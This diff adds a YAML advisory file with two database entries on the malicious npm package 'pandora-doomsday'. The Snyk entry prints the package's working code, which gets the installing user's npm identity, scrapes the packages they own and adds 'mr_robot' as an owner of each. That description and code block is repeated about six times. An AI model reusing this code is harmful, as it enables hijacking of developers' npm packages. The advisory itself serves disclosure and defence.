@@ -1,0 +1,146 @@
+---
+- id: nodesecurity:npm:pandora-doomsday:2017-09-26
+  title: Infecting Module
+  description: "The `pandora-doomsday` package is a malicious package that adds itself
+    to the package.json of other packages discovered on the victim host and attempts
+    to publish the package. \n\nIt has been removed from the npm registry."
+  affected_package: pandora-doomsday
+  vulnerable_versions:
+  - "<=99.999.99999"
+  patched_versions:
+  - "<0.0.0"
+  severity: medium
+  package_manager: npm
+  cvss_v3_vector: CVSS:3.0/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N
+  references:
+  - ''
+  source_url: https://nodesecurity.io/advisories/482
+- id: snykio:npm:pandora-doomsday:2017-08-08
+  title: Malicious Package
+  description: "`pandora-doomsday` is a malicious package that uses `postinstall`\nscripts
+    to perform malicious activity, like adding the owner of the\nmalicious package
+    as an owner to all packages owned by the user who\nperformed `npm install`.\n\nThis
+    is especially dangerous in production runtime environments, where\nenvironment
+    variables tend to consist of keys, passwords, tokens and\nother secrets.\n\nPoC:\n\n
+    \   function currentUser(cb) {\n      exec('npm whoami', function (err, stdout,
+    stderr) {\n        if (!err) cb(stdout);\n      });\n    }\n    \n    function
+    addOwner(packageName, newOwner) {\n      exec('npm owner add ' + newOwner + '
+    ' + packageName);\n    }\n    \n    function getModulesOwned(user, cb) {\n      var
+    url = 'https://www.npmjs.org/~' + user;\n    \n      request(url, function (error,
+    response, body) {\n        var $ = cheerio.load(body);\n        var packages =
+    $('.collaborated-packages a').map(function (i, el) {\n          return $(this).text();\n
+    \       }).get();\n    \n        cb(packages);\n      });\n    }\n    \n    currentUser(function
+    (user) {\n      if (user) {\n        getModulesOwned(user, function (modules)
+    {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
+    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
+    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`pandora-doomsday`
+    is a malicious package that uses `postinstall`\nscripts to perform malicious activity,
+    like adding the owner of the\nmalicious package as an owner to all packages owned
+    by the user who\nperformed `npm install`.\n\nThis is especially dangerous in production
+    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
+    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
+    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
+    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
+    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
+    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
+    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
+    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
+    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
+    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
+    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
+    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
+    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`pandora-doomsday`
+    is a malicious package that uses `postinstall`\nscripts to perform malicious activity,
+    like adding the owner of the\nmalicious package as an owner to all packages owned
+    by the user who\nperformed `npm install`.\n\nThis is especially dangerous in production
+    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
+    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
+    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
+    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
+    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
+    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
+    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
+    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
+    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
+    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
+    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
+    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
+    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`pandora-doomsday`
+    is a malicious package that uses `postinstall`\nscripts to perform malicious activity,
+    like adding the owner of the\nmalicious package as an owner to all packages owned
+    by the user who\nperformed `npm install`.\n\nThis is especially dangerous in production
+    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
+    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
+    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
+    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
+    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
+    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
+    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
+    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
+    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
+    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
+    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
+    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
+    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`pandora-doomsday`
+    is a malicious package that uses `postinstall`\nscripts to perform malicious activity,
+    like adding the owner of the\nmalicious package as an owner to all packages owned
+    by the user who\nperformed `npm install`.\n\nThis is especially dangerous in production
+    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
+    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
+    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
+    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
+    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
+    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
+    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
+    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
+    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
+    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
+    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
+    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
+    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`pandora-doomsday`
+    is a malicious package that uses `postinstall`\nscripts to perform malicious activity,
+    like adding the owner of the\nmalicious package as an owner to all packages owned
+    by the user who\nperformed `npm install`.\n\nThis is especially dangerous in production
+    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
+    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
+    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
+    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
+    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
+    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
+    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
+    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
+    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
+    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
+    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
+    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
+    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n\\n`pandora-doomsday`
+    is a malicious package that uses `postinstall`\nscripts to perform malicious activity,
+    like adding the owner of the\nmalicious package as an owner to all packages owned
+    by the user who\nperformed `npm install`.\n\nThis is especially dangerous in production
+    runtime environments, where\nenvironment variables tend to consist of keys, passwords,
+    tokens and\nother secrets.\n\nPoC:\n\n    function currentUser(cb) {\n      exec('npm
+    whoami', function (err, stdout, stderr) {\n        if (!err) cb(stdout);\n      });\n
+    \   }\n    \n    function addOwner(packageName, newOwner) {\n      exec('npm owner
+    add ' + newOwner + ' ' + packageName);\n    }\n    \n    function getModulesOwned(user,
+    cb) {\n      var url = 'https://www.npmjs.org/~' + user;\n    \n      request(url,
+    function (error, response, body) {\n        var $ = cheerio.load(body);\n        var
+    packages = $('.collaborated-packages a').map(function (i, el) {\n          return
+    $(this).text();\n        }).get();\n    \n        cb(packages);\n      });\n    }\n
+    \   \n    currentUser(function (user) {\n      if (user) {\n        getModulesOwned(user,
+    function (modules) {\n          modules.forEach(function (moduleName) {\n            addOwner(moduleName,
+    'mr_robot');\n          });\n        });\n      }\n    });\n\nThe list of packages
+    and their scripts are:\n\n    shrugging-logging\n    test-module-a\n    pandora-doomsday\n\n"
+  affected_package: pandora-doomsday
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2017-16127
+  cwe:
+  - CWE-506
+  credit:
+  - Jordan Wright
+  references:
+  - https://duo.com/blog/hunting-malicious-npm-packages/
+  source_url: https://snyk.io/vuln/npm:pandora-doomsday:20170917
